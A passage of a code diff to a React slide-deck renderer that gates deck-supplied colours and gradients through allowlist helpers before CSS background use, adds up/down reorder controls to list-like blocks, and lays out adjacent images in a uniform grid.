     {showCopy && <button onClick={handleCopy} style={{ position: "absolute", top: 10, right: 10, padding: "4px 10px", borderRadius: 4, border: `1px solid ${st.border}`, background: copied ? st.accent : "rgba(255,255,255,0.08)", color: copied ? "#fff" : st.muted, fontSize: 11, fontFamily: FONT.mono, cursor: "pointer", display: "flex", alignItems: "center", gap: 4, transition: "all 0.2s", zIndex: 2 }}>{copied ? "Copiado ✓" : "Copiar"}</button>}
@@ -2507,7 +2982,7 @@ function CalloutBlock({ block, cls, st, editable, onChange, SIZES }) {
   const [open, setOpen] = useState(!block.reveal);
   const isReveal = !!block.reveal;
   const chevron = isReveal ? (open ? "▾" : "▸") : null;
-  return <div className={cls} style={{ display: "flex", gap: 10, padding: "14px 18px", borderRadius: 8, background: block.bg || `${st.accent}12`, borderLeft: `3px solid ${block.border || st.accent}`, alignItems: "flex-start", ...block.style }}>
+  return <div className={cls} style={{ display: "flex", gap: 10, padding: "14px 18px", borderRadius: 8, background: cssColor(block.bg) || `${st.accent}12`, borderLeft: `3px solid ${block.border || st.accent}`, alignItems: "flex-start", ...block.style }}>
     <EditableIcon editable={editable} value={block.icon} size={18} onPick={(name) => onChange?.({ icon: name })}>
       {block.icon ? <span style={{ flexShrink: 0, display: "flex", marginTop: 2, ...((isReveal && !editable) ? { cursor: "pointer" } : {}) }} onClick={(isReveal && !editable) ? () => setOpen(!open) : undefined}>{getIcon(block.icon, { size: 18, color: block.border || st.accent, strokeWidth: 2 })}</span> : null}
     </EditableIcon>
@@ -2545,6 +3020,11 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
   // Text/icon-slot edit chrome (dashed hover outline, click-to-edit, ghost "+"
   // icon slot) must also never leak into Present mode — gate it the same way.
   const textEditable = editable && !presenting;
+  // Per-block reorder pin (see reorderCtl/ItemChrome): keeps the just-moved item's
+  // ▲▼ cluster focused at its destination slot. `_pin` is handed to itemReorder;
+  // the comparison/matrix cases read pinKey/setPinKey directly for their columns.
+  const [pinKey, setPinKey] = useState(null);
+  const _pin = { key: pinKey, set: setPinKey };
   switch (block.type) {
 
     case "heading": {
@@ -2566,18 +3046,28 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
 
     case "bullets":
       return <div className={cls} style={{ display: "flex", flexDirection: "column", gap: block.gap || 8, ...block.style }}>{(block.items || []).map((item, i) =>
-        <BulletItem key={i} item={item} index={i} block={block} editable={editable} onChange={onChange} st={st} SIZES={SIZES} staggerIdx={staggerIdx} fontScale={fontScale} presenting={presenting} />
+        <BulletItem key={i} item={item} index={i} block={block} editable={editable} onChange={onChange} st={st} SIZES={SIZES} staggerIdx={staggerIdx} fontScale={fontScale} presenting={presenting} pin={_pin} />
       )}
       {canEdit && <AddItem label="Add point" accent={st.accent} onAdd={() => addItemAt(block, onChange, newItemFor(block,"bullets"))} />}
       </div>;
 
     case "image":
-      return <ZoomWrap enabled={!!block.src && !block._solo} link={block.link}><div className={cls} style={{ display: "flex", flexDirection: "column", alignItems: block.align === "left" ? "flex-start" : block.align === "right" ? "flex-end" : "center", ...(block._solo ? { flex: 1, width: "100%", justifyContent: "center" } : {}), ...block.style }}>
+      // _gridCell: this image is a cell in a multi-image grid — fill the cell and
+      // letterbox (objectFit:contain) so mixed aspect ratios sit in uniform cells.
+      return <ZoomWrap enabled={!!block.src && !block._solo} link={block.link} fill={!!block._gridCell}><div className={cls} style={{ display: "flex", flexDirection: "column", alignItems: block.align === "left" ? "flex-start" : block.align === "right" ? "flex-end" : "center", ...(block._solo ? { flex: 1, width: "100%", justifyContent: "center" } : {}), ...(block._gridCell ? { flex: 1, minHeight: 0, width: "100%", height: "100%", justifyContent: "center", position: "relative" } : {}), ...block.style }}>
         {block.src ? <img src={block.src} alt={block.alt || ""} style={block._solo
           ? { width: "100%", height: "100%", objectFit: block.fit || "contain", borderRadius: 0 }
+          : block._gridCell
+          // Absolutely fill the grid cell so the row height is driven ONLY by the
+          // grid track (minmax(0,1fr)), never by the image's intrinsic height. A
+          // portrait/tall image therefore letterboxes (objectFit:contain) into the
+          // uniform cell instead of ballooning the row off-canvas — and, critically,
+          // it contributes 0 to the auto-height fit measurement, so a tall image no
+          // longer forces an over-aggressive slide fit-scale.
+          ? { position: "absolute", top: 0, left: 0, width: "100%", height: "100%", minHeight: 0, objectFit: block.fit || "contain", borderRadius: block.rounded ?? 8, boxShadow: block.shadow ? "0 8px 32px rgba(0,0,0,0.3)" : "none" }
           : { maxWidth: block.maxWidth || "100%", maxHeight: block.maxHeight || "100%", borderRadius: block.rounded ?? 8, objectFit: block.fit || "contain", boxShadow: block.shadow ? "0 8px 32px rgba(0,0,0,0.3)" : "none" }
-        } /> : <div style={{ padding: 32, color: st.textDim, fontFamily: FONT.mono, fontSize: 11 }}>Paste image (Ctrl+V)</div>}
-        {block.caption && <EditableText text={block.caption} editable={textEditable} onSave={(v) => onChange?.({ caption: v })} style={{ fontFamily: FONT.body, fontSize: SIZES.sm, color: st.textDim, marginTop: 8 }} />}
+        } /> : <div style={{ ...(block._gridCell ? { flex: 1, display: "flex", alignItems: "center", justifyContent: "center", width: "100%" } : {}), padding: 32, color: st.textDim, fontFamily: FONT.mono, fontSize: 11 }}>Paste image (Ctrl+V)</div>}
+        {block.caption && <EditableText text={block.caption} editable={textEditable} onSave={(v) => onChange?.({ caption: v })} style={{ fontFamily: FONT.body, fontSize: SIZES.sm, color: st.textDim, marginTop: 8, flexShrink: 0 }} />}
       </div></ZoomWrap>;
 
     case "code":
@@ -2586,7 +3076,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
     case "grid":
       return <div className={cls} style={{ display: "grid", gridTemplateColumns: `repeat(${block.cols || 2}, 1fr)`, gap: block.gap || 24, ...block.style }}>{(block.items || []).map((cell, ci) => {
         const cellStyle = { display: "flex", flexDirection: cell.direction || "column", alignItems: cell.direction === "row" ? "center" : (cell.align ? ({ left: "flex-start", center: "center", right: "flex-end" }[cell.align] || cell.align) : "center"), gap: cell.direction === "row" ? 12 : 8 };
-        if (cell.bg) cellStyle.background = cell.bg;
+        if (cell.bg) { const c = cssColor(cell.bg); if (c) cellStyle.background = c; }
         if (cell.padding) cellStyle.padding = cell.padding;
         if (cell.borderRadius) cellStyle.borderRadius = cell.borderRadius;
         if (cell.border) cellStyle.border = cell.border;
@@ -2595,6 +3085,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
         return <ItemChrome key={ci} editable={editable} presenting={presenting}
           wrapStyle={{ ...cellStyle, ...safeStyle }}
           link={cellLink} noLinkBadge linkLabel={cell.text || cell.value || cell.title}
+          reorder={itemReorder(block, onChange, ci, _pin)}
           onDelete={onChange ? () => removeItemAt(block, onChange, ci) : undefined}
           anchor={{ top: 2, left: 2, right: "auto" }}>{(cell.blocks || []).map((b, bj) => <GridCellBlock key={bj} block={b} staggerIdx={staggerIdx + ci + bj} slideTheme={st} slideAlign={slideAlign} fontScale={fontScale} presenting={presenting}
         editable={editable}
@@ -2628,7 +3119,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
           style={{ fontFamily: FONT.mono, fontSize: SIZES.xs, color: st.accent, marginTop: 14, letterSpacing: "0.05em" }} />}
       </div>;
 
-    case "divider": return <div className={cls} style={{ height: 1, background: block.color || st.border, margin: `${block.spacing || 12}px 0`, ...block.style }} />;
+    case "divider": return <div className={cls} style={{ height: 1, background: cssColor(block.color) || st.border, margin: `${block.spacing || 12}px 0`, ...block.style }} />;
     case "spacer": return <div style={{ height: block.h || 24 }} />;
 
     case "svg": {
@@ -2640,7 +3131,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
       // so any token value is also vetted. DOM-based (same pipeline as study-notes/chat diagrams);
       // the prior regex chain let unquoted/obfuscated javascript: URIs through.
       processed = sanitizeSvgMarkup(processed);
-      return <ZoomWrap enabled={!!block.markup} link={block.link}><div className={cls} style={{ maxWidth: block.maxWidth || "100%", margin: block.align === "center" ? "0 auto" : block.align === "right" ? "0 0 0 auto" : "0", background: block.bg || "transparent", padding: block.padding || "0", borderRadius: block.rounded ? 8 : 0, ...block.style }}>
+      return <ZoomWrap enabled={!!block.markup} link={block.link}><div className={cls} style={{ maxWidth: block.maxWidth || "100%", margin: block.align === "center" ? "0 auto" : block.align === "right" ? "0 0 0 auto" : "0", background: cssColor(block.bg) || "transparent", padding: block.padding || "0", borderRadius: block.rounded ? 8 : 0, ...block.style }}>
         <div dangerouslySetInnerHTML={{ __html: processed }} style={{ display: "flex", justifyContent: "center" }} />
         {block.caption && <EditableText text={block.caption} editable={textEditable} onSave={(v) => onChange?.({ caption: v })} style={{ textAlign: "center", color: block.captionColor || st.muted, fontSize: SIZES[block.captionSize || "sm"], marginTop: 8, fontStyle: "italic", fontFamily: FONT.body }} />}
       </div></ZoomWrap>;
@@ -2655,7 +3146,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
       const badgeIconSize = badgeFontPx;
       const badgePadV = Math.max(3, Math.round(badgeFontPx * 0.25));
       const badgePadH = Math.max(10, Math.round(badgeFontPx * 0.8));
-      return <div className={cls} style={{ display: "inline-flex", alignItems: "center", gap: Math.round(badgeFontPx * 0.5), fontFamily: FONT.mono, fontSize: badgeFontSize, fontWeight: 700, color: block.color || st.accent, letterSpacing: "0.15em", textTransform: "uppercase", padding: block.bg ? `${badgePadV}px ${badgePadH}px` : 0, borderRadius: 4, background: block.bg || "transparent", border: block.border ? `1px solid ${block.border}` : "none", ...block.style }}>
+      return <div className={cls} style={{ display: "inline-flex", alignItems: "center", gap: Math.round(badgeFontPx * 0.5), fontFamily: FONT.mono, fontSize: badgeFontSize, fontWeight: 700, color: block.color || st.accent, letterSpacing: "0.15em", textTransform: "uppercase", padding: block.bg ? `${badgePadV}px ${badgePadH}px` : 0, borderRadius: 4, background: cssColor(block.bg) || "transparent", border: block.border ? `1px solid ${block.border}` : "none", ...block.style }}>
         <EditableIcon editable={textEditable} value={block.icon} size={14} onPick={(name) => onChange?.({ icon: name })}>
           {block.icon ? <span style={{ display: "flex" }}>{getIcon(block.icon, { size: badgeIconSize, color: block.color || st.accent, strokeWidth: 2 })}</span> : null}
         </EditableIcon>
@@ -2685,7 +3176,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
         ? { display: "grid", gridTemplateColumns: `repeat(${cols}, 1fr)`, gap: block.gap || 14, ...block.style }
         : { display: "flex", flexDirection: "column", gap: block.gap || 14, ...block.style };
       return <div className={cls} style={containerStyle}>{(block.items || []).map((item, i) => (
-        <IconRowItem key={i} item={item} index={i} block={block} editable={editable} onChange={onChange} st={st} SIZES={SIZES} staggerIdx={staggerIdx} presenting={presenting} />
+        <IconRowItem key={i} item={item} index={i} block={block} editable={editable} onChange={onChange} st={st} SIZES={SIZES} staggerIdx={staggerIdx} presenting={presenting} pin={_pin} />
       ))}
       {canEdit && <AddItem label="Add item" accent={st.accent} style={cols > 1 ? { gridColumn: "1 / -1" } : undefined} onAdd={() => addItemAt(block, onChange, newItemFor(block,"icon-row"))} />}
       </div>;
@@ -2717,6 +3208,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
           <ItemChrome key={`item-${i}`} editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
             wrapStyle={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 6, minWidth: 0, flex: isVert ? undefined : "1 1 0" }}
             link={itemLinkOf(item)} linkLabel={item.label}
+            reorder={itemReorder(block, onChange, i, _pin)}
             onSetLink={onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
             onDelete={onChange ? () => removeItemAt(block, onChange, i) : undefined}>
             <EditableIcon editable={editable && !presenting} value={item.icon} size={iconSz} onPick={onChange ? (name) => patchItemAt(block, onChange, i, { icon: name }) : undefined}>
@@ -2771,7 +3263,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
       const headers = block.headers || [];
       const rows = block.rows || [];
       const cols = headers.length || (rows[0] || []).length || 1;
-      const hdrBg = block.headerBg || `${st.accent}20`;
+      const hdrBg = cssColor(block.headerBg) || `${st.accent}20`;
       const hdrColor = block.headerColor || (block.headerBg ? "#fff" : st.accent);
       const cellColor = block.cellColor || st.muted;
       const brdColor = block.borderColor || st.border;
@@ -2794,7 +3286,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
     case "progress": {
       const items = block.items || (block.value != null ? [{ value: block.value, label: block.label, color: block.color }] : []);
       const hasItems = Array.isArray(block.items);
-      const trackCol = block.trackColor || `${st.accent}15`;
+      const trackCol = cssColor(block.trackColor) || `${st.accent}15`;
       const barH = block.height || 8;
       const labelColor = block.labelColor || st.muted;
       return <div className={cls} style={{ display: "flex", flexDirection: "column", gap: block.gap || 14, ...block.style }}>
@@ -2812,10 +3304,11 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
         )}
         {items.map((item, i) => {
           const val = Math.max(0, Math.min(item.value || 0, 100));
-          const col = item.color || st.accent;
+          const col = cssColor(item.color) || st.accent;
           return <ItemChrome key={i} editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
             wrapStyle={{ display: "flex", flexDirection: "column", gap: 5 }}
             link={itemLinkOf(item)} linkLabel={item.label}
+            reorder={hasItems ? itemReorder(block, onChange, i, _pin) : undefined}
             onSetLink={hasItems && onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
             onDelete={hasItems && onChange ? () => removeItemAt(block, onChange, i) : undefined}>
             <div style={{ display: "flex", justifyContent: "space-between", alignItems: "baseline" }}>
@@ -2838,15 +3331,16 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
 
     case "steps": {
       const items = block.items || [];
-      const lineCol = block.lineColor || `${st.accent}40`;
+      const lineCol = cssColor(block.lineColor) || `${st.accent}40`;
       const active = typeof block.activeStep === "number" ? block.activeStep : items.length;
       return <div className={cls} style={{ display: "flex", flexDirection: "column", gap: 0, ...block.style }}>
         {items.map((item, i) => {
           const isActive = i < active;
-          const dotCol = isActive ? (block.numberColor || st.accent) : `${st.textDim}60`;
+          const dotCol = isActive ? (cssColor(block.numberColor) || st.accent) : `${st.textDim}60`;
           return <ItemChrome key={i} editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
             wrapStyle={{ display: "flex", gap: 16, alignItems: "flex-start", paddingBottom: i < items.length - 1 ? 20 : 0 }}
             link={itemLinkOf(item)} linkLabel={item.title}
+            reorder={itemReorder(block, onChange, i, _pin)}
             onSetLink={onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
             onDelete={onChange ? () => removeItemAt(block, onChange, i) : undefined}>
             <div style={{ display: "flex", flexDirection: "column", alignItems: "center", flexShrink: 0, width: 28 }}>
@@ -2868,7 +3362,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
       const variant = block.variant || "filled";
       return <div className={cls} style={{ display: "flex", flexWrap: "wrap", gap: block.gap || 8, ...block.style }}>
         {items.map((item, i) => {
-          const col = item.color || st.accent;
+          const col = cssColor(item.color) || st.accent;
           const vs = variant === "outline"
             ? { background: "transparent", border: `1px solid ${col}`, color: col }
             : variant === "subtle"
@@ -2877,6 +3371,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
           return <ItemChrome key={i} editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
             wrapStyle={{ display: "inline-flex", alignItems: "center", gap: 5, padding: "4px 12px", borderRadius: 20, fontFamily: FONT.mono, fontSize: SIZES[block.size || "xs"], fontWeight: 600, letterSpacing: "0.02em", ...vs, ...(item.style && typeof item.style === "object" && !Array.isArray(item.style) ? item.style : {}) }}
             link={itemLinkOf(item)} linkLabel={item.text}
+            reorder={itemReorder(block, onChange, i, _pin)}
             onSetLink={onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
             onDelete={onChange ? () => removeItemAt(block, onChange, i) : undefined}>
             <EditableIcon editable={editable && !presenting} value={item.icon} size={12} onPick={onChange ? (name) => patchItemAt(block, onChange, i, { icon: name }) : undefined}>
@@ -2892,8 +3387,8 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
     case "timeline": {
       const items = block.items || [];
       const isVert = block.direction === "vertical";
-      const lineCol = block.lineColor || `${st.accent}40`;
-      const dotCol = block.dotColor || st.accent;
+      const lineCol = cssColor(block.lineColor) || `${st.accent}40`;
+      const dotCol = cssColor(block.dotColor) || st.accent;
 
       if (isVert) {
         return <div className={cls} style={{ display: "flex", flexDirection: "column", gap: 0, ...block.style }}>
@@ -2901,6 +3396,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
             <ItemChrome key={i} editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
               wrapStyle={{ display: "flex", gap: 16, alignItems: "flex-start", paddingBottom: i < items.length - 1 ? 24 : 0 }}
               link={itemLinkOf(item)} linkLabel={item.title}
+              reorder={itemReorder(block, onChange, i, _pin)}
               onSetLink={onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
               onDelete={onChange ? () => removeItemAt(block, onChange, i) : undefined}>
               <div style={{ display: "flex", flexDirection: "column", alignItems: "center", flexShrink: 0, width: 14 }}>
@@ -2926,6 +3422,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
             <ItemChrome key={i} editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
               wrapStyle={{ flex: "1 1 0", display: "flex", flexDirection: "column", alignItems: "center", minWidth: 0 }}
               link={itemLinkOf(item)} linkLabel={item.title}
+              reorder={itemReorder(block, onChange, i, _pin)}
               onSetLink={onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
               onDelete={onChange ? () => removeItemAt(block, onChange, i) : undefined}>
               <div style={{ width: 10, height: 10, borderRadius: "50%", background: dotCol, flexShrink: 0, zIndex: 1, marginBottom: 10 }} />
@@ -2943,8 +3440,8 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
       const items = block.items || [];
       const left = items[0] || {};
       const right = items[1] || {};
-      const leftColor = left.color || "#ef4444";
-      const rightColor = right.color || "#22c55e";
+      const leftColor = cssColor(left.color) || "#ef4444";
+      const rightColor = cssColor(right.color) || "#22c55e";
       const dividerLabel = block.dividerLabel || "VS";
       // Per-point delete/link, nested in items[side].items
       const deletePoint = (side, pi) => onChange?.({ items: items.map((col, k) => k === side ? { ...col, items: (col.items || []).filter((_, j) => j !== pi) } : col) });
@@ -2960,6 +3457,16 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
         cols[side] = { ...cols[side], items: [...prev, clonePoint(prev[prev.length - 1])] };
         onChange?.({ items: cols });
       };
+      const movePoint = (side, pi, dir) => onChange?.({ items: items.map((col, k) => {
+        if (k !== side) return col;
+        const pts = [...(col.items || [])];
+        const t = dir === "up" ? pi - 1 : pi + 1;
+        if (t < 0 || t >= pts.length) return col;
+        [pts[pi], pts[t]] = [pts[t], pts[pi]];
+        return { ...col, items: pts };
+      }) });
+      const pointReorder = (side, pts, pi) => (onChange && (pts || []).length > 1)
+        ? reorderCtl(pts.length, pi, (dir) => movePoint(side, pi, dir), (k) => `c${side}_${k}`, _pin) : undefined;
       return <div className={cls} style={{ display: "flex", gap: 0, flex: 1, alignItems: "stretch", ...block.style }}>
         <div style={{ flex: 1, background: `${leftColor}08`, border: `1px solid ${leftColor}30`, borderRadius: "12px 0 0 12px", padding: "20px 22px", display: "flex", flexDirection: "column", alignItems: "center" }}>
           <div style={{ display: "flex", flexDirection: "column", gap: 10, maxWidth: "100%" }}>
@@ -2973,6 +3480,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
               <ItemChrome key={pi} editable={editable} presenting={presenting}
                 wrapStyle={{ display: "flex", alignItems: "start", gap: 8, fontSize: SIZES[block.size || "sm"], fontFamily: FONT.body, color: st.text, lineHeight: 1.5 }}
                 link={itemLinkOf(pt)} linkLabel={typeof pt === "string" ? pt : pt.text}
+                reorder={pointReorder(0, left.items, pi)}
                 onSetLink={onChange ? (url) => linkPoint(0, pi, url) : undefined}
                 onDelete={onChange ? () => deletePoint(0, pi) : undefined}>
                 <span style={{ width: 6, height: 6, borderRadius: "50%", background: leftColor, flexShrink: 0, marginTop: 7 }} />
@@ -2997,6 +3505,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
               <ItemChrome key={pi} editable={editable} presenting={presenting}
                 wrapStyle={{ display: "flex", alignItems: "start", gap: 8, fontSize: SIZES[block.size || "sm"], fontFamily: FONT.body, color: st.text, lineHeight: 1.5 }}
                 link={itemLinkOf(pt)} linkLabel={typeof pt === "string" ? pt : pt.text}
+                reorder={pointReorder(1, right.items, pi)}
                 onSetLink={onChange ? (url) => linkPoint(1, pi, url) : undefined}
                 onDelete={onChange ? () => deletePoint(1, pi) : undefined}>
                 <span style={{ width: 6, height: 6, borderRadius: "50%", background: rightColor, flexShrink: 0, marginTop: 7 }} />
@@ -3017,7 +3526,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
       return <><ZoomWrap enabled={items.length > 0} link={block.link}><div className={cls} style={{ width: "100%", ...block.style }}>
         <svg viewBox={`0 0 700 ${count * (stageH + gap)}`} style={{ width: "100%", maxWidth: 700 }} xmlns="http://www.w3.org/2000/svg">
           {items.map((item, i) => {
-            const col = item.color || st.accent;
+            const col = cssColor(item.color) || st.accent;
             const inset = (i / count) * 250;
             const nextInset = ((i + 1) / count) * 250;
             const y = i * (stageH + gap);
@@ -3052,7 +3561,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
         <svg viewBox={`0 0 520 ${cy * 2 + 40}`} style={{ width: "100%", maxWidth: 520 }} xmlns="http://www.w3.org/2000/svg">
           <defs>
             {items.map((_, i) => {
-              const col = items[i]?.color || defaultColors[i % defaultColors.length];
+              const col = cssColor(items[i]?.color) || defaultColors[i % defaultColors.length];
               return <marker key={`m${i}`} id={`cyc-arr-${staggerIdx}-${i}`} markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
                 <polygon points="0 0, 10 3.5, 0 7" fill={col} />
               </marker>;
@@ -3065,7 +3574,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
           {items.map((item, i) => {
             const angle = (2 * Math.PI * i / n) - Math.PI / 2;
             const nextAngle = (2 * Math.PI * ((i + 1) % n) / n) - Math.PI / 2;
-            const col = item.color || defaultColors[i % defaultColors.length];
+            const col = cssColor(item.color) || defaultColors[i % defaultColors.length];
             const nx = cx + radius * Math.cos(angle);
             const ny = cy + radius * Math.sin(angle);
             const nextNx = cx + radius * Math.cos(nextAngle);
@@ -3099,12 +3608,13 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
       const showIcons = block.showIcons !== false;
       return <><div className={cls} style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 0, width: "100%", ...(block.bordered ? { background: `${st.text}05`, border: `1px solid ${st.border}`, borderRadius: 12, padding: "20px 0" } : {}), ...block.style }}>
         {items.map((item, i) => {
-          const col = item.color || st.accent;
+          const col = cssColor(item.color) || st.accent;
           return <React.Fragment key={i}>
             {i > 0 && <div style={{ width: 1, height: block.compact ? 56 : 80, background: st.border || "#334155", flexShrink: 0 }} />}
             <ItemChrome editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
               wrapStyle={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", gap: 8, padding: block.compact ? "16px 12px" : "24px 16px" }}
               link={itemLinkOf(item)} linkLabel={item.label}
+              reorder={itemReorder(block, onChange, i, _pin)}
               onSetLink={onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
               onDelete={onChange ? () => removeItemAt(block, onChange, i) : undefined}>
               {showIcons && <EditableIcon editable={editable && !presenting} value={item.icon} size={20} onPick={onChange ? (name) => patchItemAt(block, onChange, i, { icon: name }) : undefined}>
@@ -3147,6 +3657,16 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
         const prev = qq.items || [];
         return { ...qq, items: [...prev, clonePoint(prev[prev.length - 1])] };
       }) });
+      const moveQPoint = (qi, pi, dir) => onChange?.({ [qKey]: quadrants.map((qq, k) => {
+        if (k !== qi) return qq;
+        const pts = [...(qq.items || [])];
+        const t = dir === "up" ? pi - 1 : pi + 1;
+        if (t < 0 || t >= pts.length) return qq;
+        [pts[pi], pts[t]] = [pts[t], pts[pi]];
+        return { ...qq, items: pts };
+      }) });
+      const qPointReorder = (qi, pts, pi) => (onChange && (pts || []).length > 1)
+        ? reorderCtl(pts.length, pi, (dir) => moveQPoint(qi, pi, dir), (k) => `q${qi}_${k}`, _pin) : undefined;
       const renderRow = (indices, radii, yLabel) => (
         <div style={{ display: "flex", gap: 0, alignItems: "stretch" }}>
           {hasY && <div style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 24, flexShrink: 0 }}>
@@ -3167,6 +3687,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
                   <ItemChrome key={pi} editable={editable} presenting={presenting}
                     wrapStyle={{ fontSize: SIZES.xs, fontFamily: FONT.body, color: st.text, marginBottom: 6, display: "flex", gap: 6 }}
                     link={itemLinkOf(pt)} linkLabel={typeof pt === "string" ? pt : pt.text}
+                    reorder={qPointReorder(qi, qd.items, pi)}
                     onSetLink={onChange ? (url) => linkQPoint(qi, pi, url) : undefined}
                     onDelete={onChange ? () => deleteQPoint(qi, pi) : undefined}>
                     <span style={{ color: qc }}>•</span> {typeof pt === "string" ? pt : pt.text || ""}
@@ -3205,6 +3726,7 @@ function RenderBlock({ block: rawBlock, staggerIdx, slideTheme, editable, onChan
           return <ItemChrome key={i} editable={editable} presenting={presenting} className={stg(staggerIdx, i)}
             wrapStyle={{ display: "flex", alignItems: "center", gap: 12, padding: "10px 16px", background: `${labelColor}08`, borderRadius: 8 }}
             link={itemLinkOf(item)} linkLabel={typeof item === "string" ? item : item.text}
+            reorder={itemReorder(block, onChange, i, _pin)}
             onSetLink={onChange ? (url) => setItemLink(block, onChange, i, url) : undefined}
             onDelete={onChange ? () => removeItemAt(block, onChange, i) : undefined}>
             <div style={{ width: 22, height: 22, borderRadius: "50%", background: status === "done" ? cfg.bg : status === "blocked" ? cfg.bg : "transparent", border: status === "pending" ? `2px solid ${st.muted}` : status === "partial" ? `2px solid #f59e0b` : "none", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, position: "relative", overflow: "hidden" }}>
@@ -3241,10 +3763,17 @@ function BrandingOverlay({ branding, index, total, displayIndex, displayTotal, s
   })();
   const isDefaultFooter = !b.footerBg || b.footerBg === "rgba(0,0,0,0.35)";
   const isDefaultColor = !b.footerColor || b.footerColor === "#94a3b8";
-  const footerBg = isDefaultFooter && isLight ? "rgba(0,0,0,0.06)" : (b.footerBg || "rgba(0,0,0,0.35)");
+  // accentColor/footerBg are encoder-gated (cssColor) the same way slide bg/
+  // bgGradient/accent already are (v13.26): both feed a raw `background`
+  // shorthand, a fetching CSS sink, so a deck-supplied value must pass the
+  // strict color/gradient-token allowlist or fall back to the safe default —
+  // defense-in-depth so this sink can't be reached even by a future sanitizer
+  // gap. footerColor only ever reaches the non-fetching `color` property, so
+  // it stays scrubber-only like every other text-color field. (v13.27)
+  const footerBg = isDefaultFooter && isLight ? "rgba(0,0,0,0.06)" : (cssColor(b.footerBg) || "rgba(0,0,0,0.35)");
   const footerColor = isDefaultColor && isLight ? "#475569" : (b.footerColor || "#94a3b8");
   return <>
-    {b.accentBar && <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: b.accentHeight || 4, background: b.accentColor || T.accent, zIndex: 5 }} />}
+    {b.accentBar && <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: b.accentHeight || 4, background: cssColor(b.accentColor) || T.accent, zIndex: 5 }} />}
     {b.logo && (() => {
       const pos = b.logoPosition || "top-left";
       const sz = b.logoSize || 56;
@@ -3292,10 +3821,13 @@ function SlideContent({ slide, index, total, branding, editable, onEdit, present
   const blocks = _vis(slide.blocks);
   const align = slide.align || "left";
   const requestedJustify = slide.verticalAlign || (align === "center" ? "center" : "flex-start");
+  // bg/bgGradient are encoder-gated (cssColor/cssGradient) the same way accent
+  // and bgImage already are — defense-in-depth so this fetching sink can't be
+  // reached even by a future sanitizer gap, not just today's scrubber. (v13.26)
   const bgStyle = {};
-  if (slide.bg) bgStyle.background = slide.bg;
+  if (slide.bg) { const c = cssColor(slide.bg); if (c) bgStyle.background = c; }
   if (slide.bgImage) { bgStyle.backgroundImage = cssUrl(slide.bgImage); bgStyle.backgroundSize = "cover"; bgStyle.backgroundPosition = "center"; }
-  if (slide.bgGradient) bgStyle.background = slide.bgGradient;
+  if (slide.bgGradient) { const g = cssGradient(slide.bgGradient); if (g) bgStyle.background = g; }
 
   const outerRef = useRef(null);
   const innerRef = useRef(null);
@@ -3461,6 +3993,69 @@ function SlideContent({ slide, index, total, branding, editable, onEdit, present
     return [block, ...comments];
   };
 
+  // Grid a run of >=2 adjacent image blocks (given by their block indices) into a
+  // balanced CSS grid. Columns are count-driven via gridColsFor(n, region) unless
+  // the author pins slide.imageCols. Each cell fills its track (objectFit:contain via
+  // the image block's _gridCell flag). An incomplete last row is centered by giving
+  // its first cell a leading column offset (grid is 2x-subdivided so cells span 2).
+  const renderImageGrid = (idxs, region) => {
+    const runLen = idxs.length;
+    // Belt-and-braces: ingress already clamps imageCols to an integer 1..6
+    // (SLIDE_NUMERIC_BOUNDS), but this value drives a CSS grid track count, so
